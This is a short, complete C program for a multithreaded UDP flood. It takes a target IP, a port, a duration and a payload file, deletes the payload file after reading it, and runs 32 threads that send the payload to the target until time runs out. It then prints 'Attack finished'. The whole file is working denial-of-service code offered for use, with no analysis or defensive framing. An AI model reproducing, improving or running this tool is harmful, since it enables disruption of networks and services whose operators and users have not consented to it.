#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>

#define MAX_PAYLOAD 250
#define THREADS 32

struct attack {
    char ip[16];
    int port;
    int time;
    char payload[MAX_PAYLOAD];
    int size;
};

void *flood(void *arg) {
    struct attack *a = (struct attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr;
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(a->port);
    inet_pton(AF_INET, a->ip, &addr.sin_addr);
    
    time_t start = time(NULL);
    
    while (time(NULL) - start < a->time) {
        sendto(sock, a->payload, a->size, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    close(sock);
    free(a);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("./udppayload ip port time payload_file\n");
        return 1;
    }
    
    // Leer payload desde archivo
    FILE *f = fopen(argv[4], "rb");  // Cambiado a "rb" para leer binario
    if (!f) {
        printf("Error leyendo payload\n");
        return 1;
    }
    
    char payload[MAX_PAYLOAD];
    int size = fread(payload, 1, MAX_PAYLOAD, f);
    fclose(f);  // CORREGIDO: cerrar FILE* no char*
    
    if (size <= 0) {
        printf("Payload vacio\n");
        return 1;
    }
    
    // Borrar archivo temporal
    unlink(argv[4]);
    
    pthread_t threads[THREADS];
    
    for (int i = 0; i < THREADS; i++) {
        struct attack *a = malloc(sizeof(struct attack));
        strcpy(a->ip, argv[1]);
        a->port = atoi(argv[2]);
        a->time = atoi(argv[3]);
        memcpy(a->payload, payload, size);
        a->size = size;
        pthread_create(&threads[i], NULL, flood, a);
    }
    
    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("Attack finished\n");
    return 0;
}
